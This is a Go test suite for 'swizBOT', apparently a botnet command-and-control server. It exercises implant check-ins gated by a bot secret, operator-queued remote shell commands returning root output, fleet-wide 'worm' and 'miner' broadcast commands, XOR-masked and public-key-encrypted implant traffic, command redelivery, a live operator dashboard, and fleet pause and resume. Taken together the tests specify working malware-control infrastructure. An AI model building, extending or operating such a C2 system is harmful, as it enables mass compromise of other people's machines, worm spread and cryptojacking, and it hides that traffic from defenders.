package main

import (
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/websocket"
	"github.com/saviorSEC/swizBOT/internal/channel"
)

const (
	testToken  = "op-token-1"
	testSecret = "bot-secret-1"
)

func newTestServer(t *testing.T) (*Server, *httptest.Server) {
	t.Helper()
	logger := log.New(io.Discard, "", 0)
	s := NewServer(Config{Token: testToken, BotSecret: testSecret, XOR: 0xAA, PruneAfter: 0}, logger)
	ts := httptest.NewServer(s.Handler())
	t.Cleanup(ts.Close)
	return s, ts
}

func doJSON(t *testing.T, method, url, token string, body []byte) (*http.Response, []byte) {
	t.Helper()
	hdrs := map[string]string{}
	if token != "" {
		hdrs["X-C2-Token"] = token
	}
	return doJSONH(t, method, url, hdrs, body)
}

func doJSONH(t *testing.T, method, url string, hdrs map[string]string, body []byte) (*http.Response, []byte) {
	t.Helper()
	req, err := http.NewRequest(method, url, bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return resp, data
}

func botCheckin(t *testing.T, base string, secret string, wantStatus int) Command {
	t.Helper()
	req, _ := http.NewRequest(http.MethodGet,
		base+"/checkin?bot_id=bot-1&os=linux&arch=amd64", nil)
	req.Header.Set("X-Bot-Secret", secret)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != wantStatus {
		t.Fatalf("checkin status = %d, want %d", resp.StatusCode, wantStatus)
	}
	var cmd Command
	if wantStatus == http.StatusOK {
		json.NewDecoder(resp.Body).Decode(&cmd)
	}
	return cmd
}

func xorBody(t *testing.T, v map[string]string) []byte {
	t.Helper()
	data, _ := json.Marshal(v)
	XorMask(data, 0xAA)
	return data
}

func TestBotSecretGate(t *testing.T) {
	_, ts := newTestServer(t)
	// missing secret -> 403
	req, _ := http.NewRequest(http.MethodGet, ts.URL+"/checkin?bot_id=b1", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("want 403 without secret, got %d", resp.StatusCode)
	}
	// with secret -> 200 and empty command
	cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK)
	if !cmd.IsEmpty() {
		t.Fatalf("expected empty command on first checkin, got %+v", cmd)
	}
}

func TestOperatorTokenGate(t *testing.T) {
	_, ts := newTestServer(t)
	// no token -> 401
	resp, _ := doJSON(t, http.MethodGet, ts.URL+"/list", "", nil)
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("want 401 without token, got %d", resp.StatusCode)
	}
	// wrong token -> 401
	resp, _ = doJSON(t, http.MethodGet, ts.URL+"/list", "wrong", nil)
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("want 401 with wrong token, got %d", resp.StatusCode)
	}
	// right token -> 200
	resp, _ = doJSON(t, http.MethodGet, ts.URL+"/list", testToken, nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("want 200 with token, got %d", resp.StatusCode)
	}
}

func TestLoginCookieFlow(t *testing.T) {
	_, ts := newTestServer(t)
	client := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	resp, err := client.Get(ts.URL + "/login?token=" + testToken)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusFound {
		t.Fatalf("want 302, got %d", resp.StatusCode)
	}
	cookies := resp.Cookies()
	found := false
	for _, c := range cookies {
		if c.Name == "c2_token" && c.Value == testToken {
			found = true
		}
	}
	if !found {
		t.Fatal("c2_token cookie not set")
	}
	// bad token -> 401
	resp2, _ := client.Get(ts.URL + "/login?token=wrong")
	resp2.Body.Close()
	if resp2.StatusCode != http.StatusUnauthorized {
		t.Fatalf("want 401 for bad login token, got %d", resp2.StatusCode)
	}
}

func TestFullLifecycle(t *testing.T) {
	_, ts := newTestServer(t)

	// register
	botCheckin(t, ts.URL, testSecret, http.StatusOK)

	// queue a command (operator)
	resp, data := doJSON(t, http.MethodGet,
		ts.URL+"/command?bot_id=bot-1&cmd=exec&payload=id", testToken, nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("queue status = %d (%s)", resp.StatusCode, data)
	}

	// bot checks in and receives the command
	cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK)
	if cmd.Type != "exec" || cmd.Payload != "id" || cmd.ID == "" {
		t.Fatalf("delivered command = %+v", cmd)
	}

	// bot reports the result (XOR body, bot-secret header)
	resp, data = doJSONH(t, http.MethodPost, ts.URL+"/result", map[string]string{"X-Bot-Secret": testSecret}, xorBody(t, map[string]string{
		"bot_id": "bot-1", "command_id": cmd.ID,
		"output": "uid=0(root)", "status": "success",
	}))
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("result status = %d (%s)", resp.StatusCode, data)
	}

	// next checkin: nothing pending
	if c := botCheckin(t, ts.URL, testSecret, http.StatusOK); !c.IsEmpty() {
		t.Fatalf("expected empty after ack, got %+v", c)
	}

	// bot list shows the result
	resp, data = doJSON(t, http.MethodGet, ts.URL+"/api/bots", testToken, nil)
	var bots []*Bot
	if err := json.Unmarshal(data, &bots); err != nil {
		t.Fatal(err)
	}
	if len(bots) != 1 {
		t.Fatalf("bots = %d, want 1", len(bots))
	}
	b := bots[0]
	if b.LastResult == nil || b.LastResult.Output != "uid=0(root)" {
		t.Fatalf("last_result = %+v", b.LastResult)
	}
	if !b.Active {
		t.Fatal("bot should be active")
	}
}

func TestQueueToUnknownBot404(t *testing.T) {
	_, ts := newTestServer(t)
	resp, _ := doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=nope&cmd=exec", testToken, nil)
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("want 404, got %d", resp.StatusCode)
	}
}

func TestBroadcastQueue(t *testing.T) {
	_, ts := newTestServer(t)
	botCheckin(t, ts.URL, testSecret, http.StatusOK)
	resp, data := doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=*&cmd=worm", testToken, nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("broadcast status = %d (%s)", resp.StatusCode, data)
	}
	if cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK); cmd.Type != "worm" {
		t.Fatalf("expected worm broadcast delivery, got %+v", cmd)
	}
}

func TestRedeliveryAndDrop(t *testing.T) {
	s, ts := newTestServer(t)

	// frozen clock
	now := time.Now()
	s.now = func() time.Time { return now }

	botCheckin(t, ts.URL, testSecret, http.StatusOK) // register
	doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=bot-1&cmd=exec&payload=slow", testToken, nil)

	// first delivery
	cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK)
	if cmd.ID == "" {
		t.Fatal("expected delivery")
	}

	// no result arrives; advance past the redelivery window
	now = now.Add(redeliverAfter + 5*time.Second)
	cmd = botCheckin(t, ts.URL, testSecret, http.StatusOK)
	if cmd.ID == "" {
		t.Fatal("expected redelivery after window")
	}
	if cmd.ID == "" {
		t.Fatal("id empty")
	}

	// exhaust redeliveries
	for i := 0; i < maxRedeliver; i++ {
		now = now.Add(redeliverAfter + 5*time.Second)
		botCheckin(t, ts.URL, testSecret, http.StatusOK)
	}
	// after max redeliveries the command is dropped
	now = now.Add(redeliverAfter + 5*time.Second)
	if c := botCheckin(t, ts.URL, testSecret, http.StatusOK); !c.IsEmpty() {
		t.Fatalf("expected drop after max redeliveries, got %+v", c)
	}
}

func TestLateResultRecorded(t *testing.T) {
	_, ts := newTestServer(t)
	botCheckin(t, ts.URL, testSecret, http.StatusOK)
	doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=bot-1&cmd=exec&payload=id", testToken, nil)
	cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK)

	// ack arrives after the next checkin already delivered (duplicate exec) --
	// still recorded as the last result
	doJSONH(t, http.MethodPost, ts.URL+"/result", map[string]string{"X-Bot-Secret": testSecret}, xorBody(t, map[string]string{
		"bot_id": "bot-1", "command_id": cmd.ID, "output": "late", "status": "success",
	}))
	resp, data := doJSON(t, http.MethodGet, ts.URL+"/list", testToken, nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatal(string(data))
	}
	var bots []*Bot
	json.Unmarshal(data, &bots)
	if len(bots) != 1 || bots[0].LastResult == nil || bots[0].LastResult.Output != "late" {
		t.Fatalf("late result missing: %+v", bots)
	}
}

func TestPostJSONCommand(t *testing.T) {
	_, ts := newTestServer(t)
	botCheckin(t, ts.URL, testSecret, http.StatusOK)
	body := `{"bot_id":"bot-1","type":"exec","payload":"whoami"}`
	resp, data := doJSON(t, http.MethodPost, ts.URL+"/command", testToken, []byte(body))
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("POST /command = %d %s", resp.StatusCode, data)
	}
	cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK)
	if cmd.Type != "exec" || cmd.Payload != "whoami" {
		t.Fatalf("got %+v", cmd)
	}
}

func TestWebSocketOperatorBroadcast(t *testing.T) {
	_, ts := newTestServer(t)

	wsURL := "ws" + strings.TrimPrefix(ts.URL, "http") + "/ws"
	header := http.Header{"X-C2-Token": []string{testToken}}
	conn, _, err := websocket.DefaultDialer.Dial(wsURL, header)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()

	// register a bot -> the operator must see a bot_update frame
	botCheckin(t, ts.URL, testSecret, http.StatusOK)

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	var msg wsMessage
	for {
		if err := conn.ReadJSON(&msg); err != nil {
			t.Fatal(err)
		}
		if msg.Type == "bot_update" && len(msg.Bots) == 1 && msg.Bots[0].ID == "bot-1" {
			return
		}
	}
}

func TestStaticDashboardServed(t *testing.T) {
	_, ts := newTestServer(t)
	resp, data := doJSON(t, http.MethodGet, ts.URL+"/", "", nil)
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("dashboard status %d", resp.StatusCode)
	}
	if !strings.Contains(string(data), "swizBOT") {
		t.Fatal("dashboard body missing branding")
	}
}

func TestXorMaskRoundTrip(t *testing.T) {
	orig := []byte(`{"bot_id":"x","output":"hello world"}`)
	masked := append([]byte(nil), orig...)
	XorMask(masked, 0xAA)
	if bytes.Equal(masked, orig) {
		t.Fatal("mask did nothing")
	}
	XorMask(masked, 0xAA)
	if !bytes.Equal(masked, orig) {
		t.Fatal("mask is not its own inverse")
	}
}

func TestParseCommandRequest(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/command?bot_id=b&cmd=exec&payload=p", nil)
	botID, cmdType, payload, target, err := parseCommandRequest(req)
	if err != nil || botID != "b" || cmdType != "exec" || payload != "p" || target != "" {
		t.Fatalf("got %q %q %q %q err=%v", botID, cmdType, payload, target, err)
	}
	req2 := httptest.NewRequest(http.MethodPost, "/command",
		strings.NewReader(`{"bot_id":"b2","type":"miner","payload":"pool wal"}`))
	req2.Header.Set("Content-Type", "application/json")
	botID, cmdType, payload, _, err = parseCommandRequest(req2)
	if err != nil || botID != "b2" || cmdType != "miner" || payload != "pool wal" {
		t.Fatalf("json post parse: %q %q %q err=%v", botID, cmdType, payload, err)
	}
}

func TestEncryptedChannelE2E(t *testing.T) {
	// operator keypair (server side)
	opPrivHex, opPubHex, err := channel.GeneratePrivateKey()
	if err != nil {
		t.Fatal(err)
	}
	// implant keypair (bot side)
	botPrivHex, botPubHex, err := channel.GeneratePrivateKey()
	if err != nil {
		t.Fatal(err)
	}
	botPriv, _ := channel.ParsePrivateKey(botPrivHex)
	opPub, _ := channel.ParsePublicKey(opPubHex)

	logger := log.New(io.Discard, "", 0)
	s := NewServer(Config{Token: testToken, BotSecret: testSecret, BotKey: opPrivHex, XOR: 0xAA}, logger)
	ts := httptest.NewServer(s.Handler())
	defer ts.Close()

	// register the bot first (pubkey rides the checkin)
	req, _ := http.NewRequest(http.MethodGet,
		ts.URL+"/checkin?bot_id=bot-c&os=linux&arch=amd64&pub="+botPubHex, nil)
	req.Header.Set("X-Bot-Secret", testSecret)
	req.Header.Set("X-Crypto", "1")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	// queue a command, then checkin again -> sealed delivery
	doJSONH(t, http.MethodGet, ts.URL+"/command?bot_id=bot-c&cmd=exec&payload=id",
		map[string]string{"X-C2-Token": testToken}, nil)

	req, _ = http.NewRequest(http.MethodGet,
		ts.URL+"/checkin?bot_id=bot-c&os=linux&arch=amd64&pub="+botPubHex, nil)
	req.Header.Set("X-Bot-Secret", testSecret)
	req.Header.Set("X-Crypto", "1")
	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	sealedCmd, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.Header.Get("X-Crypto") != "aead" {
		t.Fatal("server did not seal the checkin response")
	}
	// bot opens with its own private key
	cmdJSON, err := channel.Open(botPriv, sealedCmd)
	if err != nil {
		t.Fatalf("bot could not open sealed command: %v", err)
	}
	var cmd Command
	if err := json.Unmarshal(cmdJSON, &cmd); err != nil {
		t.Fatal(err)
	}
	if cmd.Type != "exec" || cmd.Payload != "id" {
		t.Fatalf("sealed command wrong: %+v", cmd)
	}

	// result sealed TO the operator key
	resultBody, _ := json.Marshal(map[string]string{
		"bot_id": "bot-c", "command_id": cmd.ID, "output": "uid=0", "status": "success",
	})
	sealedResult, err := channel.Seal(opPub, resultBody)
	if err != nil {
		t.Fatal(err)
	}
	req2, _ := http.NewRequest(http.MethodPost, ts.URL+"/result", bytes.NewReader(sealedResult))
	req2.Header.Set("X-Bot-Secret", testSecret)
	req2.Header.Set("X-Crypto", "1")
	req2.Header.Set("Content-Type", "application/octet-stream")
	resp2, err := http.DefaultClient.Do(req2)
	if err != nil {
		t.Fatal(err)
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()
	if resp2.StatusCode != http.StatusOK {
		t.Fatalf("sealed result rejected: %d", resp2.StatusCode)
	}

	// the server must NOT have accepted a forged/wrong-key result
	_, otherPubHex, _ := channel.GeneratePrivateKey()
	otherPub, _ := channel.ParsePublicKey(otherPubHex)
	forged, _ := channel.Seal(otherPub, resultBody)
	req3, _ := http.NewRequest(http.MethodPost, ts.URL+"/result", bytes.NewReader(forged))
	req3.Header.Set("X-Bot-Secret", testSecret)
	req3.Header.Set("X-Crypto", "1")
	resp3, err := http.DefaultClient.Do(req3)
	if err != nil {
		t.Fatal(err)
	}
	io.Copy(io.Discard, resp3.Body)
	resp3.Body.Close()
	if resp3.StatusCode == http.StatusOK {
		t.Fatal("server accepted a result sealed with the wrong operator key")
	}
}

func TestFleetPauseResume(t *testing.T) {
	_, ts := newTestServer(t)
	botCheckin(t, ts.URL, testSecret, http.StatusOK) // register

	// queue exec, deliver it
	doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=bot-1&cmd=exec&payload=id", testToken, nil)
	if cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK); cmd.Type != "exec" {
		t.Fatalf("expected delivery before pause, got %+v", cmd)
	}

	// pause the fleet
	resp, data := doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=*&cmd=pause", testToken, nil)
	if resp.StatusCode != http.StatusOK || !strings.Contains(string(data), "paused") {
		t.Fatalf("pause failed: %d %s", resp.StatusCode, data)
	}

	// queue another command; paused fleet must not deliver it
	doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=bot-1&cmd=exec&payload=whoami", testToken, nil)
	if cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK); !cmd.IsEmpty() {
		t.Fatalf("paused fleet delivered a command: %+v", cmd)
	}

	// resume
	resp, data = doJSON(t, http.MethodGet, ts.URL+"/command?bot_id=*&cmd=resume", testToken, nil)
	if resp.StatusCode != http.StatusOK || !strings.Contains(string(data), "resumed") {
		t.Fatalf("resume failed: %d %s", resp.StatusCode, data)
	}

	// queued command now delivers
	if cmd := botCheckin(t, ts.URL, testSecret, http.StatusOK); cmd.Payload != "whoami" {
		t.Fatalf("expected whoami after resume, got %+v", cmd)
	}
}
